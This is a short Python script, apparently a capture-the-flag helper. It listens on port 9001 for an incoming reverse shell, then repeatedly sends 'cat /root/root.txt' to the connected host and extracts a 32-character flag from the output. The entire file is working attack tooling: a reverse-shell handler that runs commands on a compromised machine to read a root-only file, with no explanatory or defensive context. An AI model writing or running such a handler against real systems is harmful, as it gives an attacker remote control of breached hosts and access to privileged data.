import socket
from time import sleep
import re


class Revsh(object):
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 9001
        self.buffer_size = 1024 * 512
        self.s = socket.socket()

        self.s.bind((self.host, self.port))
        self.s.listen(15)

        self.client_socket, self.client_address = self.s.accept()
        sleep(5)
        

    def send_command(self):
        print("Getting root flag")
        
        while True:
            command = "cat /root/root.txt"
            self.client_socket.send(command.encode("utf-8") + b"\n")
            output = self.client_socket.recv(self.buffer_size).decode()
            
            flag = self.check_output_for_flag(output)
            if flag:
                print(f"Root flag: {flag}")
                break
            
    def check_output_for_flag(self, output):
        pattern = r'^[A-Za-z0-9]{32}$'
        for i in output.split("\n"):
            
            if re.match(pattern, i):
                return i
                
        return None


if __name__ == "__main__":
    revsh = Revsh()
    revsh.send_command()
